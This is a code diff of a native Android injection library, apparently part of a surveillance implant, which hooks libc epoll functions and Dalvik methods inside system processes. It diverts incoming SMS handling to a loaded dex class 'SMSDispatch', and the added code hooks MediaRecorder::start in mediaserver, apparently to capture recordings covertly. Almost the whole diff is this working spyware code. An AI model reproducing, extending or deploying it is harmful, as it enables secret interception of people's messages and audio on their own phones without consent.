@@ -27,12 +27,14 @@
 #include <sys/epoll.h>
 #include <stdlib.h>
 #include <jni.h>
+#include "base.h"
 
-
+#include "common.h"
+#include "extern.h"
 #include "hook.h"
 #include "dexstuff.h"
 #include "dalvik_hook.h"
-#include "base.h"
+
 #include "ipc_examiner.h"
 char *dumpPath    =  ".................____________.......................";
 char *dex    =  ".................____________......................1";
@@ -58,7 +60,7 @@ typedef enum android_LogPriority
 char tag[256];
 #define log(...) {\
 tag[0]=tag[1]=0;\
-snprintf(tag,256,"smsdispatcht:%s",__FUNCTION__);\
+snprintf(tag,256,"smsdispatch:%s",__FUNCTION__);\
 __android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
 #define logf(...) {FILE *f = fopen("/data/local/tmp/log", "a+");\
         if(f!=NULL){\
@@ -68,23 +70,30 @@ __android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
 #else
 #define log(...)
 #endif
-struct dalvik_cache_t
-{
-   // for the call inside the hijack
-   jclass cls_h;
-   jmethodID mid_h;
-};
 
-static struct hook_t eph;
-static struct dexstuff_t d;
+//fnc declaration :
+void create_cnf(char *cnf_name);
+struct dexstuff_t d;
+
+struct hook_t eph_epoll_w;
+struct hook_t eph_epoll_p;
+struct hook_t eph_media_const;
+struct hook_t eph_media_start;
 static struct dalvik_hook_t processUnsolicited_dh;
 static struct dalvik_cache_t processUnsolicited_cache;
 static struct dalvik_hook_t dispatchNormalMessage;
+static struct dalvik_cache_t dispatchNormalMessage_cache;
 static char createcnf = 0;
 
 //arm version of hook
 extern int my_epoll_wait_arm(int epfd, struct epoll_event *events, int maxevents, int timeout);
 extern int my_epoll_pwait_arm(int epfd, struct epoll_event *events, int maxevents, int timeout, const sigset_t* ss);
+
+// mediaserver instrumentation
+extern int instrument_media(void);
+extern int instrument_media_arm(void);
+extern status_t mediaRecorder_start_arm(void);
+extern status_t mediaRecorder_start(void);
 
 // switch for debug output of dalvikhook and dexstuff code
 static int debug;
@@ -253,8 +262,41 @@ static jmethodID mid_throw_toString = NULL;
 static jclass frame_class = NULL ;
 static jmethodID mid_frame_toString = NULL;
 
+/*
+ * who_am_i(unsigned int max_len)
+ * return the command line of the current process or null in case of error
+ * NOTE: the buffer containing the command line is allocated using
+ * max_len parameter, It's up to the CALLER to FREE the BUFFER!!
+ */
+char * who_am_i(unsigned int max_len)
+{
+   FILE *f;
+   char *cmdline = NULL;
+   if(!max_len){
+      log(" who_am_i() invalid arg passed\n");
+      return cmdline;
+   }
+   if((cmdline=calloc(1,max_len))==NULL){
+      log(" who_am_i() malloc failed\n");
+      return cmdline;
+   }
 
-static int load_dext(char * dext_path,char **classes)
+   f = fopen("/proc/self/cmdline", "r");
+   if (f) {
+      char *p = cmdline;
+      fgets(cmdline, max_len-1, f);
+      fclose(f);
+      cmdline[max_len-1]='\0';
+      log(" who_am_i() cmdline is=\"%s\"\n",cmdline);
+   }else{
+      log(" who_am_i() opening file \"/proc/self/cmdline\" failed\n");
+      free(cmdline);
+      cmdline=NULL;
+   }
+   return cmdline;
+
+}
+int load_dext(char * dext_path,char **classes)
 {
 
    int cookie = 0;
@@ -264,7 +306,7 @@ static int load_dext(char * dext_path,char **classes)
       log(" loaddex null path passed\n");
       return 1;
    }else{
-      log(" loaddex path %s\n",dext_path);
+      log(" loaddex path %s\n",file);
    }
    if(strstr(dext_path,"*")!=NULL){
       log(" loaddex gobbler passed\n");
@@ -279,14 +321,8 @@ static int load_dext(char * dext_path,char **classes)
    cookie = dexstuff_loaddex(&d, file);
    log("loaddex res = %x\n", cookie)
    if (!cookie) {
-      char *dext_file = file;
-      while (strstr(dext_file, "/") != NULL) {
-         dext_file = strstr(dext_file, "/");
-      }
-      if (dext_file == NULL) {
-         dext_file = "";
-      }
-      log("make sure /data/dalvik-cache/ is world writable and delete data@local@tmp@%s", dext_file);
+
+      log("make sure /data/dalvik-cache/ is world writable");
       res=1;
    }
    if(res==0){
@@ -314,7 +350,7 @@ static int load_dext(char * dext_path,char **classes)
 
    return res;
 }
-char *classes[] = {
+static char *classes[] = {
          "com/android/dvci/event/OOB/SMSDispatch",
          "com/android/dvci/util/Reflect",
          "com/android/dvci/util/LowEventMsg",
@@ -334,7 +370,7 @@ static void my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
    int doit = 1;
    if( p== 0x0){
       log("invalid parcel pointer");
-      return callOrig;
+      return ;
    }
    log("parcel pointer p=%p",p);
 
@@ -406,43 +442,40 @@ static void my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
 static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessageBase)
 {
    jint callOrig = 1;
+   int go_ahead=1;
 
-      if (load_dext(dex,classes)) {
-         log("failed to load class ");
-      } else {
-         // call static method and passin the sms
-         log("smsMessageBase = 0x%x\n", smsMessageBase)
-         jclass smsd = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
+     if (dispatchNormalMessage_cache.cls_h == 0) {
+        if (load_dext(dex, classes)) {
+           log("failed to load class ");
+           go_ahead = 0;
+        }
+     } else {
+      log("using cache");
+    }
 
-      if (smsd) {
-         jmethodID staticId = (*env)->GetStaticMethodID(env, smsd, "dispatchNormalMessage", "(Ljava/lang/Object;)I");
+     if (go_ahead) {
+        // call static method and passin the sms
+        //log(" parcel = 0x%x\n", p)
+        if (dispatchNormalMessage_cache.cls_h == 0) {
+           log("smsMessageBase = 0x%x\n", smsMessageBase)
+           dispatchNormalMessage_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
+        }
+        if (dispatchNormalMessage_cache.cls_h != 0) {
+           if (dispatchNormalMessage_cache.mid_h == 0) {
+              dispatchNormalMessage_cache.mid_h = (*env)->GetStaticMethodID(env, dispatchNormalMessage_cache.cls_h, "dispatchNormalMessage", "(Ljava/lang/Object;)I");
+           }
+           if (dispatchNormalMessage_cache.mid_h) {
+              jvalue args[1];
+              args[0].l = smsMessageBase;
+              callOrig = (*env)->CallStaticIntMethodA(env, dispatchNormalMessage_cache.cls_h, dispatchNormalMessage_cache.mid_h, args);
+           } else {
+              log("method not found!\n")
+           }
+        } else {
+           log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
+        }
+     }
 
-         if (staticId) {
-            jvalue args[1];
-            /*
-             typedef union jvalue {
-             jboolean z;
-             jbyte    b;
-             jchar    c;
-             jshort   s;
-             jint     i;
-             jlong    j;
-             jfloat   f;
-             jdouble  d;
-             jobject  l;
-             } jvalue;
-             */
-            args[0].l = smsMessageBase;
-            //NativeType CallStatic<type>MethodA(JNIEnv *env, jclass clazz,jmethodID methodID, jvalue *args);
-
-            callOrig = (*env)->CallStaticIntMethodA(env, smsd, staticId, args);
-         } else {
-            log("method not found!\n")
-         }
-      } else {
-         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
-      }
-   }
    // call original SMS dispatch method
    if ((*env)->ExceptionOccurred(env)) {
       log("got an exception!!");
@@ -451,7 +484,6 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
    }
    jvalue args[1];
    dalvik_prepare(&d, &dispatchNormalMessage, env);
-
    if (callOrig) {
       args[0].l = smsMessageBase;
       callOrig = (*env)->CallIntMethodA(env, obj, dispatchNormalMessage.mid, args);
@@ -468,9 +500,10 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
 static int instrument(){
 
    // resolve symbols from DVM
-   dexstuff_resolv_dvm(&d);
+
    log("my_epoll_wait: try_hook\n")
    if( strncmp(quite_needle,process,strlen(quite_needle)) == 0 ){
+      dexstuff_resolv_dvm(&d);
       int hooked = 2;
       log("hooking sms\n")
       if (and_maj == 4){
@@ -504,14 +537,15 @@ static int instrument(){
 
          }
          if(dumpDir!=NULL && hooked == 0 && createcnf){
-            create_cnf();
+            create_cnf("pa.cnf");
          }
    } else {
       log("injection not possible \n");
       return 1;
    }
    }else if( strncmp("mediaserver",process,strlen("mediaserver")) == 0 ){
-      log("hooking mediaserver\n")
+      log("instrumenting mediaserver\n")
+      return instrument_media();
    }else{
       log("hooking unknown so skip\n")
       return 1;
@@ -523,13 +557,23 @@ static int instrument(){
 int my_epoll_pwait(int epfd, struct epoll_event *events, int maxevents, int timeout,const sigset_t* ss)
 {
    int (*orig_epoll_pwait)(int epfd, struct epoll_event *events, int maxevents, int timeout,const sigset_t* ss);
-   orig_epoll_pwait = (void*) eph.orig;
-   // remove hook for epoll_wait
-   hook_precall(&eph);
-   if(instrument()){
-      log("hooking failed\n")
+   orig_epoll_pwait = (void*) eph_epoll_p.orig;
+
+   int inst_res=0;
+
+   if((inst_res=instrument())){
+      if(inst_res!=-1){
+         log("hooking failed\n")
+      }
    }
-      int res = orig_epoll_pwait(epfd, events, maxevents, timeout,ss);
+   // remove hook for epoll_wait
+   hook_precall(&eph_epoll_p);
+   int res = orig_epoll_pwait(epfd, events, maxevents, timeout,ss);
+   if(inst_res==-1){
+      log("still in zygote (<pre-initialized>) process, waiting full specialization...\n");
+      // reinstrument
+      hook_postcall(&eph_epoll_p);
+   }
    return res;
 }
 int my_epoll_pwait_thumb(int epfd, struct epoll_event *events, int maxevents, int timeout, const sigset_t* ss)
@@ -543,21 +587,31 @@ int my_epoll_wait_thumb(int epfd, struct epoll_event *events, int maxevents, int
 int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
 {
    int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
-   orig_epoll_wait = (void*) eph.orig;
+   orig_epoll_wait = (void*) eph_epoll_w.orig;
    // remove hook for epoll_wait
-   hook_precall(&eph);
-   if(instrument()){
-      log("hooking failed\n")
+   int inst_res=0;
+
+   if((inst_res=instrument())){
+      if(inst_res>1){
+         log("hooking failed %d\n",inst_res)
+      }
    }
-      int res = orig_epoll_wait(epfd, events, maxevents, timeout);
+   // remove hook for epoll_wait
+   hook_precall(&eph_epoll_w);
+   int res = orig_epoll_wait(epfd, events, maxevents, timeout);
+   if(inst_res==-1){
+      log("still in zygote (<pre-initialized>) process, waiting full specialization...\n");
+      // reinstrument
+      hook_postcall(&eph_epoll_w);
+   }
    return res;
 }
-void create_cnf()
+void create_cnf(char *cnf_name)
 {
-   int full_path_log_filename_length = strlen(dumpDir) + 1 + strlen("pa.cnf") + 1;
+   int full_path_log_filename_length = strlen(dumpDir) + 1 + strlen(cnf_name) + 1;
    char * full_path_log_filename = malloc(sizeof(char) * full_path_log_filename_length);
    if (full_path_log_filename != NULL) {
-      snprintf(full_path_log_filename, full_path_log_filename_length, "%s/pa.cnf", dumpDir);
+      snprintf(full_path_log_filename, full_path_log_filename_length, "%s/%s", dumpDir,cnf_name);
       int fd = open(full_path_log_filename, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
       if (fd > 0) {
          log("create_cnf: wrote log file %s fd %d\n", full_path_log_filename, fd);
@@ -593,8 +647,11 @@ char * findLast(char *where, char *what){
 // set my_init as the entry point
 void __attribute__ ((constructor)) my_init(void);
 
+
+
 void my_init(void)
 {
+   int ff = 0xdeadf16a;
 
    char *lastAt = NULL;
    log("started\n");
@@ -608,9 +665,11 @@ void my_init(void)
       /* No binary patch applied, use the default value of the dexfile */
       log("my_init: got path %s\n",dumpPath);
       dumpDir = dumpDir_default;
+      ff++;
    }else{
       log("my_init: path patched %s\n",dumpPath);
       dumpDir = dumpPath;
+      ff--;
    }
    createcnf = 1;
    if( strncmp(quite_needle,dex,strlen(quite_needle)) == 0 ){
@@ -625,20 +684,50 @@ void my_init(void)
    set_logfunction(my_log2);
    // set log function for libdalvikhook (very important!)
    dalvikhook_set_logfunction(my_log2);
-
-   if (and_maj==5 || (and_maj==4 && and_min==0) ){
-
-      if(hook(&eph, getpid(), "libc.", "epoll_pwait", my_epoll_pwait_arm, my_epoll_pwait_thumb) && createcnf==1){
-               log("my_init: epoll_pwait hooked\n");
-       }
-   }else{
-
-      if(hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait_arm, my_epoll_wait_thumb) && createcnf==1){
-         log("my_init: epoll_wait hooked\n");
+   if( strncmp("mediaserver",process,strlen("mediaserver")) == 0 ){
+      log("hooking mediaserver\n");
+     // todo: not ready if(hook(&eph_media_const, getpid(), "libmedia.", "_ZN7android13MediaRecorderC1Ev",  instrument_media_arm, instrument_media) && createcnf==1){
+     //    log("my_init: media build1 hooked\n");
+     // }
+      if(hook(&eph_media_start, getpid(), "libmedia.", "_ZN7android13MediaRecorder5startEv",  mediaRecorder_start_arm, mediaRecorder_start) && createcnf==1){
+         log("my_init: media start hooked\n");
       }
+      if(hook(&eph_epoll_w, getpid(), "libc.", "epoll_wait", my_epoll_wait, my_epoll_wait_thumb) && createcnf==1){
+                 log("my_init: epoll_wait hooked\n");
+      }
+      char *cmdline = who_am_i(64);
+      if(cmdline){
+         if( strcasestr(cmdline,"zygote")!=NULL ){
+            if(dumpDir!=NULL  && createcnf){
+               create_cnf("mm.cnf");
+            }
+         }
+         free(cmdline);
+      }
+
+   }else{
+      if (and_maj==5 || (and_maj==4 && and_min==0) ){
+
+         if(hook(&eph_epoll_p, getpid(), "libc.", "epoll_pwait", my_epoll_pwait_arm, my_epoll_pwait_thumb) && createcnf==1){
+            log("my_init: epoll_pwait hooked\n");
+         }
+      }else{
+
+         if(hook(&eph_epoll_w, getpid(), "libc.", "epoll_wait", my_epoll_wait, my_epoll_wait_thumb) && createcnf==1){
+            log("my_init: epoll_wait hooked\n");
+         }
+      }
+      dexstuff_resolv_dvm(&d);
    }
 
-   dexstuff_resolv_dvm(&d);
+
+
    //log("my_init: printClass\n");
    //dalvik_dump_class(&d,"");
+}
+void my_remove(void){
+
+   log("my_remove:dumpPath is %s\n",dumpPath);
+   log("my_remove:dex %s\n",dexFile_default);
+   log("my_remove:process %s\n",process);
 }
